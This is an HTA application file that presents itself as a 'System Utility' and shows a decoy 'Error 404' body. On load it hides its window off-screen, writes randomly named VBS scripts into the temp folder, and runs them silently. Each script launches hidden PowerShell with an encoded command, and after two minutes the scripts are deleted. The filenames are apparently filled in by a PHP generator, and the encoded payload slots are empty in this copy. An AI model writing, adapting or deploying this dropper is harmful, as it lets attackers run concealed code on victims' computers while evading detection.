<!DOCTYPE html>
<html>

<head>
    <title>System Utility</title>
    <HTA:APPLICATION ID="Dynamic" APPLICATIONNAME="System Utility" BORDER="none" CAPTION="no" SHOWINTASKBAR="no"
        WINDOWSTATE="minimize" SYSMENU="no" />
    <script language="VBScript">
        Sub Window_OnLoad
        ' Hide the window completely
        Window.resizeTo 0, 0
        Window.moveTo - 30000, -30000
            On Error Resume Next

            Dim encodedCmds(3)
        encodedCmds(0) = ""
encodedCmds(1) = ""
encodedCmds(2) = ""

        ' Array of random filenames (filled by PHP)
            Dim fileNames(3)
        fileNames(0) = "W_jpLNWXaiUIJJLfNpy.vbs"
fileNames(1) = "balzG2s3NdbNMFU7X.vbs"
fileNames(2) = "TLJVAHAu.vbs"

        ' Create objects
            Dim fso, wsh, tempFolder, i, filePath, vbsContent, file
            Set fso = CreateObject("Scripting.FileSystemObject")
            Set wsh = CreateObject("WScript.Shell")
        tempFolder = fso.GetSpecialFolder(2)   ' Temporary folder

        ' Loop to create and run 2 VBS files
            For i = 0 To 1
        ' Build full path
        filePath = tempFolder & "\" & fileNames(i)

        ' VBScript content with the i‑th encoded command
        vbsContent = "On Error Resume Next" & vbCrLf & _
        "Randomize" & vbCrLf & _
        "Dim titles, randomTitle" & vbCrLf & _
        "titles = Array(""System Process"", ""Windows Update"", ""Runtime Broker"")" & vbCrLf & _
        "randomTitle = titles(Int((UBound(titles) + 1) * Rnd))" & vbCrLf & _
        "Dim encoded" & vbCrLf & _
        "encoded = """ & encodedCmds(i) & """" & vbCrLf & _
        "Set sh = CreateObject(""WScript.Shell"")" & vbCrLf & _
        "sh.Run ""powershell.exe -W Hidden -EncodedCommand "" & encoded, 0, False"

        ' Write the VBS file
                Set file = fso.CreateTextFile(filePath, True)
        file.Write vbsContent
        file.Close

        ' Execute the VBS file silently
        wsh.Run "wscript.exe """ & filePath & """", 0, False
        Next

        ' Schedule cleanup after 2 minutes (120000 ms)
        window.setTimeout "CleanUp", 120000, "VBScript"
        End Sub

        Sub CleanUp()
            On Error Resume Next
            Dim fso, i, filePath
            Set fso = CreateObject("Scripting.FileSystemObject")
        ' Use the same temporary folder and filenames
        tempFolder = fso.GetSpecialFolder(2)
            For i = 0 To 1
        filePath = tempFolder & "\" & fileNames(i)
        fso.DeleteFile filePath
        Next
        window.close
        End Sub
    </script>
</head>

<body>
    <!-- Error 404 -->
</body>

</html>